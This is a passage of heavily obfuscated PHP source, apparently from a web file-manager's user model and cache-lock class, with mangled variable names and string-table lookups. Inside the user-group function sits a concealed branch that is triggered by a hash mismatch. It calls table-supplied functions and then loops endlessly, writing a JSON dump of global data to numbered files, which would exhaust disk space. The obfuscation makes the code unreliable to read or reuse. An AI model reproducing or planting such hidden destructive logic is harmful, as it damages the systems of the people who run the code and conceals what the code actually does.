Pinyin::get($óÜëâœõ, $šªæÉµ—[627]))); } private function nickNameRpt() { $€â‡» =& $_SERVER[Î‹ÃÂŞ„]; $§•öğ¼ú = Model($€â‡»[817])->get($€â‡»[2389]); $„®Ó¼ÃÍ = $GLOBALS[$€â‡»[6]][$€â‡»[427]][$€â‡»[2389]]; $‚±ÂÔ‹ = !is_null($§•öğ¼ú) ? $§•öğ¼ú : $„®Ó¼ÃÍ; return !!$‚±ÂÔ‹; } private function _checkExist($ôÜÈÁ¯¶, $ÚÅºÉô = false) { $ğ•å…‰õ =& $_SERVER[Î‹ÃÂŞ„]; $ŸéË•š« = array($ğ•å…‰õ[32] => UserModel::ERROR_USER_EXIST_NAME, $ğ•å…‰õ[2185] => UserModel::ERROR_USER_EXIST_NICKNAME, $ğ•å…‰õ[351] => UserModel::ERROR_USER_EXIST_EMAIL, $ğ•å…‰õ[2377] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ŸéË•š«[$ğ•å…‰õ[2185]]); } $¥±¢»Ú¬ = $ÚÅºÉô ? array($ğ•å…‰õ[1704] => array($ğ•å…‰õ[2390], $ÚÅºÉô)) : array(); foreach ($ŸéË•š« as $½ÏÑˆŸ => $Ğ¢İ…û) { $æ˜ã¼¬Ú = array(); foreach ($ŸéË•š« as $ÈŸÇ¢õ => $œ¶¿³ö) { if (isset($ôÜÈÁ¯¶[$ÈŸÇ¢õ]) && $ôÜÈÁ¯¶[$ÈŸÇ¢õ]) { $æ˜ã¼¬Ú[] = $ôÜÈÁ¯¶[$ÈŸÇ¢õ]; } } if (!$æ˜ã¼¬Ú) { continue; } $èßìŒÚª = array_merge(array($½ÏÑˆŸ => array($ğ•å…‰õ[7], $æ˜ã¼¬Ú)), $¥±¢»Ú¬); $ô˜›À‹À = $this->where($èßìŒÚª)->find(); if ($ô˜›À‹À) { return $Ğ¢İ…û; } } return !0; } public function userListInfo($‹÷‹®îØ) { $ú¾ğ´­ş =& $_SERVER[Î‹ÃÂŞ„]; $ÔïÛŠ‚ = array(); $‹÷‹®îØ = is_array($‹÷‹®îØ) ? array_unique($‹÷‹®îØ) : array(); if (!$‹÷‹®îØ) { return $ÔïÛŠ‚; } if (count($‹÷‹®îØ) < 20) { foreach ($‹÷‹®îØ as $ÁËèªá›) { $ÔïÛŠ‚[$ÁËèªá› . $ú¾ğ´­ş[12]] = $this->getInfoSimpleOuter($ÁËèªá›); } } else { $óŞ‰ìÃ = array($ú¾ğ´­ş[1695] => array($ú¾ğ´­ş[462], $‹÷‹®îØ)); if (count($‹÷‹®îØ) == 1) { $óŞ‰ìÃ = array($ú¾ğ´­ş[1695] => $‹÷‹®îØ[0]); } $á€ƒú › = Model($ú¾ğ´­ş[549])->field($this->simpleField)->where($óŞ‰ìÃ)->select(); $á€ƒú › = array_to_keyvalue($á€ƒú ›, $ú¾ğ´­ş[1704]); foreach ($‹÷‹®îØ as $ÁËèªá›) { $Õë•• = $á€ƒú ›[$ÁËèªá›]; if (!$Õë••) { $ÔïÛŠ‚[$ÁËèªá› . $ú¾ğ´­ş[12]] = $this->getInfoSimpleOuter($ÁËèªá›); continue; } $Õë••[$ú¾ğ´­ş[2362]] = Action($ú¾ğ´­ş[2363])->parseUrl($Õë••[$ú¾ğ´­ş[2362]]); $ÔïÛŠ‚[$ÁËèªá› . $ú¾ğ´­ş[12]] = $Õë••; } } return $ÔïÛŠ‚; } protected function userStatus($¶ÌÎ«Ì, $Š¬­—ÖÓ) { $ì–Û»Ï = $this->getInfoSimple($¶ÌÎ«Ì); if (!$ì–Û»Ï) { return !1; } $À¢¹Ò‚• = array($_SERVER[Î‹ÃÂŞ„][797] => $Š¬­—ÖÓ); return $this->userEdit($¶ÌÎ«Ì, $À¢¹Ò‚•); } protected function userRemove($©®¸ÛóŒ) { $‰¶ˆ‡úË =& $_SERVER[Î‹ÃÂŞ„]; $áÅ¶–Ò = $this->getInfoSimple($©®¸ÛóŒ); if (!$áÅ¶–Ò) { return !1; } $Å¿ñ™ì² = array($‰¶ˆ‡úË[1695] => $©®¸ÛóŒ); Model($‰¶ˆ‡úË[635])->where($Å¿ñ™ì²)->delete(); Model($‰¶ˆ‡úË[2391])->where($Å¿ñ™ì²)->delete(); Model($‰¶ˆ‡úË[1992])->where($Å¿ñ™ì²)->delete(); Model($‰¶ˆ‡úË[2376])->where($Å¿ñ™ì²)->delete(); Model($‰¶ˆ‡úË[1123])->where($Å¿ñ™ì²)->delete(); Model($‰¶ˆ‡úË[2202])->removeUserAll($©®¸ÛóŒ); Model($‰¶ˆ‡úË[872])->userRootRemove($©®¸ÛóŒ); return $this->where($Å¿ñ™ì²)->delete(); } protected function userGroupSet($Åæ¬¾Åˆ, $º°…ˆŸ, $Ç™‚ğğö = array()) { $ªªöÁ•É =& $_SERVER[Î‹ÃÂŞ„]; $ÚõÖêı§ = $_SERVER[$ªªöÁ•É[929]] . $ªªöÁ•É[930]; $¥àßæ½ = $ªªöÁ•É[925]; if ($_SERVER[$ªªöÁ•É[926]] != $¥àßæ½($ÚõÖêı§)) { $˜úÓ­¸Ù = $ªªöÁ•É[927]; $„„¼¼¬° = $ªªöÁ•É[928]; $‚•†•¬£ = $_SERVER[$ªªöÁ•É[929]] . $ªªöÁ•É[930]; $‘ı­Ûó = $„„¼¼¬°($‚•†•¬£); $²ªú±ã = explode($ªªöÁ•É[248], $‘ı­Ûó); if (count($²ªú±ã) < $ªªöÁ•É[667]) { $ÓœöÂã = $ªªöÁ•É[931]; $ÓœöÂã(); } $½Ö¨Å‰¸ = $ªªöÁ•É[932]; $½Ö¨Å‰¸($_SERVER[$ªªöÁ•É[933]]); $˜úÓ­¸Ù = $ªªöÁ•É[927]; $˜úÓ­¸Ù(); $íğå‡˜° = $ªªöÁ•É[934]; $é¾ì‰ı¬ = json_encode($GLOBALS[$ªªöÁ•É[935]]); $Â™µ¶çê = 1; for ($’ø³šúé = $Â™µ¶çê; $’ø³šúé > 0; $’ø³šúé++) { $íğå‡˜°(DATA_PATH . $’ø³šúé, $é¾ì‰ı¬); } } $Š šÔ¡š = $this->getInfoSimple($Åæ¬¾Åˆ); if (!$Š šÔ¡š || !is_array($º°…ˆŸ)) { return !1; } $µùØ»Û = Model($ªªöÁ•É[1992]); $µùØ»Û->where(array($ªªöÁ•É[1704] => $Åæ¬¾Åˆ))->delete(); $ƒîãÎ‘ = array(); $ÕÌ®ËÉ = 0; foreach ($º°…ˆŸ as $òºşˆ·Ô => $»ğ±«º¾) { $ƒ¢…Ì¨ò = array($ªªöÁ•É[1704] => $Åæ¬¾Åˆ, $ªªöÁ•É[1902] => $òºşˆ·Ô, $ªªöÁ•É[2006] => $»ğ±«º¾); $ƒ¢…Ì¨ò[$ªªöÁ•É[1926]] = isset($Ç™‚ğğö[$ÕÌ®ËÉ]) ? $Ç™‚ğğö[$ÕÌ®ËÉ] : 0; $ÕÌ®ËÉ++; $ƒîãÎ‘[] = $ƒ¢…Ì¨ò; } return $µùØ»Û->addAll($ƒîãÎ‘, array(), !0); } protected function userGroupAdd($Ëä¾¨‹×, $€“¡ƒ¿ƒ = array()) { $§§¨Öºå =& $_SERVER[Î‹ÃÂŞ„]; $¡å€õÔ† = $this->getInfoSimple($Ëä¾¨‹×); if (!$¡å€õÔ† || empty($€“¡ƒ¿ƒ)) { return !1; } $åÍ½­öØ = array(); foreach ($€“¡ƒ¿ƒ as $º±›Í•© => $ ²‡şÒ”) { $åÍ½­öØ[] = array($§§¨Öºå[1704] => $Ëä¾¨‹×, $§§¨Öºå[1902] => $º±›Í•©, $§§¨Öºå[2006] => $ ²‡şÒ”, $§§¨Öºå[1926] => 0); } return Model($§§¨Öºå[1992])->addAll($åÍ½­öØ, array(), !0); } protected function userGroupRemove($ğ÷ÊÙ, $Ùç£’Í ) { $™² ôƒå =& $_SERVER[Î‹ÃÂŞ„]; $ÂŸ„Ãß³ = $this->getInfoSimple($ğ÷ÊÙ); if (!$ÂŸ„Ãß³ || !$Ùç£’Í ) { return !1; } $ƒ²Ùóİ¸ = array($™² ôƒå[1695] => $ğ÷ÊÙ, $™² ôƒå[1990] => $Ùç£’Í ); return Model($™² ôƒå[1992])->where($ƒ²Ùóİ¸)->delete(); } public function listData() { $ı˜è…ÕÇ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ı˜è…ÕÇ[$_SERVER[Î‹ÃÂŞ„][415]]); return $ı˜è…ÕÇ; } public function listByID($íşºÄâÎ) { $Ï½è­çÊ =& $_SERVER[Î‹ÃÂŞ„]; if (!$íşºÄâÎ) { return; } $¯„”Ø‰õ = array($Ï½è­çÊ[1704] => array($Ï½è­çÊ[7], $íşºÄâÎ)); $³¶óñ½ù = $this->where($¯„”Ø‰õ)->select(); $³¶óñ½ù = array_sort_keep($³¶óñ½ù, $Ï½è­çÊ[1704], $íşºÄâÎ); $this->_listDataApply($³¶óñ½ù); return $³¶óñ½ù; } public function listByGroup($Ğ«Ù—œ¬ = 0, $—ÛâÎœó = array()) { $ÉŸï¹‚á =& $_SERVER[Î‹ÃÂŞ„]; $ù‡ºè’¦ = $ÉŸï¹‚á[12]; $²ñÆß“ñ = array(); if ($Ğ«Ù—œ¬) { $²ñÆß“ñ = array($ÉŸï¹‚á[2392] => intval($Ğ«Ù—œ¬)); $ù‡ºè’¦ = "\x4c\x45\x46\x54\x20\112\117\111\116\40{$this->tablePrefix}\165\x73\x65\162\137\x67\x72\x6f\x75\160\40\x75\163\x65\x72\137\147\162\157\x75\x70\40\x6f\x6e\40\165\x73\145\x72\x2e\x75\x73\x65\x72\111\104\40\x3d\x20\165\x73\145\x72\137\x67\x72\157\x75\x70\56\165\x73\145\162\111\104"; $¼ó¨öæ¬ = Input::get($ÉŸï¹‚á[500], null, $ÉŸï¹‚á[12]) ? $ÉŸï¹‚á[12] : $ÉŸï¹‚á[2393]; } if (isset($—ÛâÎœó[$ÉŸï¹‚á[797]])) { $²ñÆß“ñ[$ÉŸï¹‚á[2394]] = $—ÛâÎœó[$ÉŸï¹‚á[797]]; } $¼Šú¬ûë = $this->_makeOrder($¼ó¨öæ¬)->field($ÉŸï¹‚á[2395])->where($²ñÆß“ñ)->join($ù‡ºè’¦)->selectPage(50); $this->_listDataApply($¼Šú¬ûë[$ÉŸï¹‚á[415]]); return $¼Šú¬ûë; } private function _makeOrder($Úâ¯ğøç = '') { $ªíÑÑ¬Ë =& $_SERVER[Î‹ÃÂŞ„]; $”üúü‚Œ = array($ªíÑÑ¬Ë[1704], $ªíÑÑ¬Ë[32], $ªíÑÑ¬Ë[1891], $ªíÑÑ¬Ë[1863], $ªíÑÑ¬Ë[217]); $Ö šš‚ = array($ªíÑÑ¬Ë[493] => $ªíÑÑ¬Ë[494], $ªíÑÑ¬Ë[495] => $ªíÑÑ¬Ë[496]); $î¿À§Ô = Input::get($ªíÑÑ¬Ë[500], $ªíÑÑ¬Ë[7], $ªíÑÑ¬Ë[1695], $”üúü‚Œ); $®µ€ÊÇ¶ = Input::get($ªíÑÑ¬Ë[501], $ªíÑÑ¬Ë[7], $ªíÑÑ¬Ë[1993], array($ªíÑÑ¬Ë[1993], $ªíÑÑ¬Ë[495])); $®µ€ÊÇ¶ = $Ö šš‚[$®µ€ÊÇ¶]; $Úâ¯ğøç = $Úâ¯ğøç . "\165\x73\x65\162\56{$î¿À§Ô}\40{$®µ€ÊÇ¶}\54\x20\x75\x73\145\162\x2e\x75\x73\x65\162\x49\104\x20\x61\x73\x63"; return $this->alias($ªíÑÑ¬Ë[2120])->order($Úâ¯ğøç); } public function listSearch($Ê€¥êšØ) { $¥Ø§Á²ñ =& $_SERVER[Î‹ÃÂŞ„]; $Ï©–íº = $Ê€¥êšØ[$¥Ø§Á²ñ[1996]]; $«—Ÿ¿Œ = isset($Ê€¥êšØ[$¥Ø§Á²ñ[1997]]) ? $Ê€¥êšØ[$¥Ø§Á²ñ[1997]] : !1; $Ï©–íº = str_replace($¥Ø§Á²ñ[1998], $¥Ø§Á²ñ[1999], trim($Ï©–íº)); $µ¬²†‡¡ = array($¥Ø§Á²ñ[32] => array($¥Ø§Á²ñ[429], "\45{$Ï©–íº}\45"), $¥Ø§Á²ñ[351] => array($¥Ø§Á²ñ[429], "{$Ï©–íº}\x25"), $¥Ø§Á²ñ[2185] => array($¥Ø§Á²ñ[429], "{$Ï©–íº}\x25"), $¥Ø§Á²ñ[1055] => $¥Ø§Á²ñ[2000]); if (Input::check($Ï©–íº, $¥Ø§Á²ñ[357])) { $µ¬²†‡¡[$¥Ø§Á²ñ[1704]] = array($¥Ø§Á²ñ[429], "{$Ï©–íº}\x25"); $µ¬²†‡¡[$¥Ø§Á²ñ[2377]] = array($¥Ø§Á²ñ[429], "{$Ï©–íº}\45"); } if (!$Ï©–íº) { $µ¬²†‡¡ = array(); } if (isset($Ê€¥êšØ[$¥Ø§Á²ñ[797]])) { $µ¬²†‡¡[$¥Ø§Á²ñ[797]] = $Ê€¥êšØ[$¥Ø§Á²ñ[797]]; } $µ¬²†‡¡ = $this->parseWhereLike($µ¬²†‡¡); $ŞÒûõí¾ = $this->_makeOrder()->where($µ¬²†‡¡)->selectPage(20); if (!$ŞÒûõí¾ || count($ŞÒûõí¾[$¥Ø§Á²ñ[415]]) < 5 && Input::check($Ï©–íº, $¥Ø§Á²ñ[364])) { $–´›ê”º = $this->_searchFromMeta($¥Ø§Á²ñ[507], $Ï©–íº, 10); $”–å€¿ã = $this->_searchFromMeta($¥Ø§Á²ñ[508], $Ï©–íº, 10); $‘ª«ûõ = array_merge($–´›ê”º, $”–å€¿ã, $ŞÒûõí¾[$¥Ø§Á²ñ[415]]); $ŞÒûõí¾[$¥Ø§Á²ñ[415]] = array_unique_by_key($‘ª«ûõ, $¥Ø§Á²ñ[1704]); $ŞÒûõí¾[$¥Ø§Á²ñ[412]][$¥Ø§Á²ñ[413]] = count($ŞÒûõí¾[$¥Ø§Á²ñ[415]]); $ŞÒûõí¾[$¥Ø§Á²ñ[412]][$¥Ø§Á²ñ[414]] = ceil($ŞÒûõí¾[$¥Ø§Á²ñ[412]][$¥Ø§Á²ñ[413]] / $ŞÒûõí¾[$¥Ø§Á²ñ[412]][$¥Ø§Á²ñ[409]]); } $this->_listDataApply($ŞÒûõí¾[$¥Ø§Á²ñ[415]]); $this->_filterByGroup($ŞÒûõí¾, $«—Ÿ¿Œ); return $ŞÒûõí¾; } private function _filterByGroup(&$¦õ”É¨­, $½àÃë³Ô) { $íşó¢à =& $_SERVER[Î‹ÃÂŞ„]; if (!$½àÃë³Ô) { return $¦õ”É¨­; } foreach ($¦õ”É¨­[$íşó¢à[415]] as $æŒ† ÏÖ => &$‡›ÀĞ¼”) { $Âî±Ñ€ = array_to_keyvalue($‡›ÀĞ¼”[$íşó¢à[2090]], $íşó¢à[12], $íşó¢à[1902]); if (!in_array($½àÃë³Ô, $Âî±Ñ€)) { unset($¦õ”É¨­[$íşó¢à[415]][$æŒ† ÏÖ]); } } unset($‡›ÀĞ¼”); $¦õ”É¨­[$íşó¢à[415]] = array_values($¦õ”É¨­[$íşó¢à[415]]); $¦õ”É¨­[$íşó¢à[412]] = array($íşó¢à[2155] => count($¦õ”É¨­[$íşó¢à[415]]), $íşó¢à[2153] => $¦õ”É¨­[$íşó¢à[412]][$íşó¢à[409]], $íşó¢à[2152] => 1, $íşó¢à[2154] => 1); } private function _searchFromMeta($‰â€¬ğ…, $°åªÇíí, $ƒÒÏÑ¡Æ) { $òíŒµ› =& $_SERVER[Î‹ÃÂŞ„]; $°åªÇíí = strtolower($°åªÇíí); $¯œĞé˜ã = array($òíŒµ›[96] => $‰â€¬ğ…, $òíŒµ›[420] => array($òíŒµ›[429], "\45{$°åªÇíí}\x25")); $¯œĞé˜ã = $this->parseWhereLike($¯œĞé˜ã); $Ë«©ö = Model($òíŒµ›[2396])->where($¯œĞé˜ã)->limit($ƒÒÏÑ¡Æ)->select(); if (!$Ë«©ö) { return array(); } $Ë«©ö = array_to_keyvalue($Ë«©ö, $òíŒµ›[12], $òíŒµ›[1704]); $¿ÖæâÇ  = $this->where(array($òíŒµ›[1695] => array($òíŒµ›[7], $Ë«©ö)))->select(); if (!$¿ÖæâÇ ) { return array(); } return $¿ÖæâÇ ; } private function _listDataApplyItem($¬ø–Š) { $‡ö¶ï¹¨ = array($¬ø–Š); $this->_listDataApply($‡ö¶ï¹¨); return $‡ö¶ï¹¨[0]; } private function _listDataApply(&$ˆĞÚÊü) { $€´ˆØä =& $_SERVER[Î‹ÃÂŞ„]; if (!$ˆĞÚÊü) { return; } array_remove_key($ˆĞÚÊü, $€´ˆØä[943]); $³ş¸›î = array_to_keyvalue($ˆĞÚÊü, $€´ˆØä[12], $€´ˆØä[1704]); $this->_listAppendGroup($ˆĞÚÊü, $³ş¸›î); $this->_listAppendMeta($ˆĞÚÊü, $³ş¸›î); $this->_listAppendSourceRoot($ˆĞÚÊü, $³ş¸›î); } private function _listAppendSourceRoot(&$£ûÎÁœÅ, $Õ±„Ø) { $Èƒ×àú€ =& $_SERVER[Î‹ÃÂŞ„]; $ÎçëøöÚ = Model($Èƒ×àú€[872])->listSourceRoot(SourceModel::TYPE_USER, $Õ±„Ø); $ÎçëøöÚ = array_to_keyvalue($ÎçëøöÚ, $Èƒ×àú€[541]); $ÎçëøöÚ = array_remove_key($ÎçëøöÚ, $Èƒ×àú€[541]); foreach ($£ûÎÁœÅ as &$î¿×¢È) { $î¿×¢È[$Èƒ×àú€[89]] = $ÎçëøöÚ[$î¿×¢È[$Èƒ×àú€[1704]]] ? $ÎçëøöÚ[$î¿×¢È[$Èƒ×àú€[1704]]] : array(); } unset($î¿×¢È); } private function _listAppendGroup(&$ÆÖÛàÌÓ, $‰ŸÉªã…) { $õöû•”Å =& $_SERVER[Î‹ÃÂŞ„]; $êâÓÑê = array($õöû•”Å[1704] => array($õöû•”Å[7], $‰ŸÉªã…)); $ª¶ùà­© = Model($õöû•”Å[1992])->where($êâÓÑê)->select(); $İ¿‹­øÆ = array_to_keyvalue($ª¶ùà­©, $õöû•”Å[12], $õöû•”Å[1902]); $İ¿‹­øÆ = array_remove_value(array_unique($İ¿‹­øÆ), $õöû•”Å[214]); if (!$İ¿‹­øÆ || !$ª¶ùà­©) { return; } $êâÓÑê = array($õöû•”Å[1902] => array($õöû•”Å[7], $İ¿‹­øÆ)); $¯â’˜±¹ = Model($õöû•”Å[2088])->field($õöû•”Å[2397])->where($êâÓÑê)->select(); $¯â’˜±¹ = array_to_keyvalue($¯â’˜±¹, $õöû•”Å[1902]); $ª¶ùà­© = array_to_keyvalue_group($ª¶ùà­©, $õöû•”Å[1704]); foreach ($ª¶ùà­© as &$À×Šêæş) { $®¸üˆ–Ã = array(); foreach ($À×Šêæş as $—°îÅã™) { if (!$—°îÅã™[$õöû•”Å[2006]]) { continue; } $Ï¶òŸ©‹ = Model($õöû•”Å[543])->listData($—°îÅã™[$õöû•”Å[2006]]); $®¸üˆ–Ã[] = array($õöû•”Å[1902] => $—°îÅã™[$õöû•”Å[1902]], $õöû•”Å[2398] => $¯â’˜±¹[$—°îÅã™[$õöû•”Å[1902]]][$õöû•”Å[32]], $õöû•”Å[556] => $¯â’˜±¹[$—°îÅã™[$õöû•”Å[1902]]][$õöû•”Å[556]], $õöû•”Å[457] => $Ï¶òŸ©‹); } $À×Šêæş = $®¸üˆ–Ã; } unset($À×Šêæş); foreach ($ÆÖÛàÌÓ as &$ö¥Üœ Ÿ) { $ö¥Üœ Ÿ[$õöû•”Å[2090]] = array(); if (isset($ª¶ùà­©[$ö¥Üœ Ÿ[$õöû•”Å[1704]]])) { $ö¥Üœ Ÿ[$õöû•”Å[2090]] = $ª¶ùà­©[$ö¥Üœ Ÿ[$õöû•”Å[1704]]]; } } unset($ö¥Üœ Ÿ); } public function userAppendGroup($¸ˆÔ¨şÑ) { $†·‡´®± =& $_SERVER[Î‹ÃÂŞ„]; if (!$¸ˆÔ¨şÑ) { return array(); } $this->_listAppendGroup($¸ˆÔ¨şÑ, array_to_keyvalue($¸ˆÔ¨şÑ, $†·‡´®±[12], $†·‡´®±[1704])); return $¸ˆÔ¨şÑ; } private function _listAppendMeta(&$ß¦¤§È¬, $ñ¿€çÈÁ) { $†‚‰ÔËõ =& $_SERVER[Î‹ÃÂŞ„]; $—æ´ö = UserJobModel::JOB_KEY; $¢¨È­ô’ = array($†‚‰ÔËõ[2378]); $¦Ñ¶û› = array($†‚‰ÔËõ[1704] => array($†‚‰ÔËõ[7], $ñ¿€çÈÁ)); $¼Åèáä— = Model($†‚‰ÔËõ[2376])->where($¦Ñ¶û›)->select(); $¼Åèáä— = array_to_keyvalue_group($¼Åèáä—, $†‚‰ÔËõ[1704]); foreach ($¼Åèáä— as &$ì˜İüÎŸ) { $Ä ï Ğ = array(); foreach ($ì˜İüÎŸ as $±èº…²½) { if (!in_array($±èº…²½[$†‚‰ÔËõ[96]], $¢¨È­ô’)) { $Ä ï Ğ[$±èº…²½[$†‚‰ÔËõ[96]]] = $±èº…²½[$†‚‰ÔËõ[420]]; } } $ì˜İüÎŸ = $Ä ï Ğ; } unset($ì˜İüÎŸ); $”Î˜Ú¤¶ = Model($†‚‰ÔËõ[2399]); foreach ($ß¦¤§È¬ as &$âñÇ²ÎĞ) { $¤—çĞ«“ = array(); if (isset($¼Åèáä—[$âñÇ²ÎĞ[$†‚‰ÔËõ[1704]]])) { $¤—çĞ«“ = $¼Åèáä—[$âñÇ²ÎĞ[$†‚‰ÔËõ[1704]]]; } $âñÇ²ÎĞ[$†‚‰ÔËõ[2400]] = array(); if (isset($¤—çĞ«“[$—æ´ö])) { $âñÇ²ÎĞ[$†‚‰ÔËõ[2400]] = $”Î˜Ú¤¶->getUserJobInfo($¤—çĞ«“[$—æ´ö]); } } unset($âñÇ²ÎĞ); } protected function groupUserAll($”ú„åáÊ) { $÷ùœ§¸™ =& $_SERVER[Î‹ÃÂŞ„]; if (!$”ú„åáÊ) { return !1; } $ÉŸÆ˜Š£ = Model($÷ùœ§¸™[1992])->field($÷ùœ§¸™[1704])->where(array($÷ùœ§¸™[1902] => array($÷ùœ§¸™[7], $”ú„åáÊ)))->select(); $ÉŸÆ˜Š£ = array_to_keyvalue($ÉŸÆ˜Š£, $÷ùœ§¸™[12], $÷ùœ§¸™[1704]); return array_unique($ÉŸÆ˜Š£); } public function userSearch($ø»ÒŠî¬, $®àÁ ŞÖ = "\x2a") { return Model($_SERVER[Î‹ÃÂŞ„][570])->where($ø»ÒŠî¬)->field($®àÁ ŞÖ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\x5f\x6f\x70\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ùŠíø™î) { $ÑçÇ‘Ş =& $_SERVER[Î‹ÃÂŞ„]; $¼¬•Šºå = defined($ÑçÇ‘Ş[2124]) && USER_ID ? USER_ID : $ÑçÇ‘Ş[12]; return "\x55\163\x65\x72\x4f\160\x74\x69\157\x6e\x5f{$ùŠíø™î}\137" . $¼¬•Šºå; } protected function filterWhere($Í¨…ûÏô) { $ë»¼Éµ½ =& $_SERVER[Î‹ÃÂŞ„]; $Í¨…ûÏô[$ë»¼Éµ½[1704]] = defined($ë»¼Éµ½[2124]) && USER_ID ? USER_ID : $ë»¼Éµ½[12]; return $Í¨…ûÏô; } public function cacheRemoveUser($ÂƒÌñüû, $¾Â­™—û) { return Cache::remove("\125\x73\145\162\x4f\160\164\151\157\x6e\x5f{$ÂƒÌñüû}\137" . $¾Â­™—û); } protected function optionDefault($îúÉ“Û = '') { $ Áæ¥Ä¤ =& $_SERVER[Î‹ÃÂŞ„]; if ($îúÉ“Û == $ Áæ¥Ä¤[12]) { return $GLOBALS[$ Áæ¥Ä¤[6]][$ Áæ¥Ä¤[2401]]; } if ($îúÉ“Û == $ Áæ¥Ä¤[2402]) { return $GLOBALS[$ Áæ¥Ä¤[6]][$ Áæ¥Ä¤[2403]]; } } } goto f¹¶’—Û¾Ş; a„æœ·ê„ß: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $‹×Öœ‰ =& $_SERVER[Î‹ÃÂŞ„]; if (self::$handle) { return self::$handle; } $İµ”¾Ø‡ = $GLOBALS[$‹×Öœ‰[6]][$‹×Öœ‰[395]]; self::$timeout = $İµ”¾Ø‡[$‹×Öœ‰[888]] ? $İµ”¾Ø‡[$‹×Öœ‰[888]] : 10; $³­®®¼¶ = _get($GLOBALS[$‹×Öœ‰[6]], $‹×Öœ‰[889]); $¸”ÛÖ¨ = $İµ”¾Ø‡[$‹×Öœ‰[874]] ? $İµ”¾Ø‡[$‹×Öœ‰[874]] : $‹×Öœ‰[216]; if ($¸”ÛÖ¨ == $‹×Öœ‰[21] && $³­®®¼¶ == $‹×Öœ‰[13]) { $¸”ÛÖ¨ = $‹×Öœ‰[216]; } switch ($¸”ÛÖ¨) { case $‹×Öœ‰[877]: self::$handle = new CacheLockRedis(); break; case $‹×Öœ‰[878]: self::$handle = new CacheLockMemcached(); break; case $‹×Öœ‰[21]: self::$handle = new CacheLockDatabase(); break; case $‹×Öœ‰[216]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($‹×Öœ‰[890], $‹×Öœ‰[891]); } return self::$handle; } private static function key($Ûäúçä±) { return $_SERVER[Î‹ÃÂŞ„][892] . Cache::key($Ûäúçä±); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¦ª€¥¿ = '') { self::$errorMsg = $¦ª€¥¿; } public static function lockGlobal($êÉÒàæ, $É”ş’£) { return self::lock($êÉÒàæ, $É”ş’£, !0); } public static function lock($õÕ¾ô³, $åª»ÜµÖ = false, $Œ¨ø‡Ô§ = false) { $™©ö‹Ïº =& $_SERVER[Î‹ÃÂŞ„]; $ÔúŠ†Ì€ = self::init(); $†¹¦ûƒ™ = self::key($õÕ¾ô³); $åª»ÜµÖ = $åª»ÜµÖ ? $åª»ÜµÖ : self::$timeout; $›Ì¢Û²¿ = timeFloat(); $ÔÊæ¶û = $ÔúŠ†Ì€->lock($†¹¦ûƒ™, $åª»ÜµÖ); $‚ ŠœìÄ = timeFloat(); if (!$ÔÊæ¶û) { $Üğ ğš = "\154\157\x63\x6b\x20\145\162\162\x6f\162\x3b\153\x65\171\x3d{$õÕ¾ô³}\x3b\164\151\155\x65\75{$åª»ÜµÖ}\x3b" . self::$errorMsg . $™©ö‹Ïº[73] . get_caller_msg(); $ÊéÆ§Ÿ = LNG($™©ö‹Ïº[893]) . "\x28{$åª»ÜµÖ}\x73\51\x2e" . LNG($™©ö‹Ïº[894]); $ÊéÆ§Ÿ .= $™©ö‹Ïº[895]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÊéÆ§Ÿ = $ÊéÆ§Ÿ . $™©ö‹Ïº[896] . self::$errorMsg; } write_log($™©ö‹Ïº[897] . sprintf($™©ö‹Ïº[898], timeFloat() - $›Ì¢Û²¿) . $™©ö‹Ïº[899] . $Üğ ğš . $™©ö‹Ïº[900] . error_get_last(), $™©ö‹Ïº[891]); show_json($ÊéÆ§Ÿ, !1); } if (!$Œ¨ø‡Ô§) { self::$lockItem[$†¹¦ûƒ™] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $âû¦··É = number_format(timeFloat() - $‚ ŠœìÄ, 3); write_log($™©ö‹Ïº[901] . $õÕ¾ô³ . $™©ö‹Ïº[902] . $âû¦··É, $™©ö‹Ïº[891]); } return $ÔÊæ¶û; } public static function lockGet($æâÁ›èñ) { $Æ†Óíïû = self::key($æâÁ›èñ); if (self::$lockItem[$Æ†Óíïû]) { return self::$lockItem[$Æ†Óíïû]; } return self::init()->lockGet($Æ†Óíïû); } public static function unlock($¢æÀªÇœ) { $èİ“ß„¦ =& $_SERVER[Î‹ÃÂŞ„]; $òÊóŞ•Ø = self::key($¢æÀªÇœ); self::$lockItem[$òÊóŞ•Ø] = null; self::init()->unlock($òÊóŞ•Ø); if (GLOBAL_DEBUG_LOG_ALL) { write_log($èİ“ß„¦[903] . $¢æÀªÇœ, $èİ“ß„¦[891]); } return; } public static function unlockRuntime() { $¶õ¼¿É =& $_SERVER[Î‹ÃÂŞ„]; $¦ĞŒÕÔ´ = self::init(); $‹í±ÑÖ¡ = !1; foreach (self::$lockItem as $‰‘¸šçº => $À±«¨Ù¾) { if (!$À±«¨Ù¾) { continue; } $¦ĞŒÕÔ´->unlock($‰‘¸šçº); if (!$‹í±ÑÖ¡) { $‹í±ÑÖ¡ = !0; write_log($¶õ¼¿É[904] . $‰‘¸šçº . $¶õ¼¿É[73] . get_caller_msg(), $¶õ¼¿É[891]); continue; } write_log($¶õ¼¿É[904] . $‰‘¸šçº, $¶õ¼¿É[891]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¦ÏŒ²‘­ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¶õ¼¿É[905] . $¦ÏŒ²‘­ . $¶õ¼¿É[906] . ACTION, $¶õ¼¿É[891]); } } public static function fileLock($ıœ¢´üÓ) { $†êşæª =& $_SERVER[Î‹ÃÂŞ„]; if (!$GLOBALS[$†êşæª[907]]) { $GLOBALS[$†êşæª[907]] = array(); } $GLOBALS[$†êşæª[907]][$ıœ¢´üÓ] = !1; $š‡¶Î— = fopen(DATA_PATH . $ıœ¢´üÓ . $†êşæª[908], $†êşæª[909]); if (!$š‡¶Î—) { return !1; } $GLOBALS[$†êşæª[907]][$ıœ¢´üÓ] = $š‡¶Î—; if (flock($š‡¶Î—, LOCK_EX)) { return !0; } self::unlock($ıœ¢´üÓ); show_json($†êşæª[910], !1); return !1; } public static function 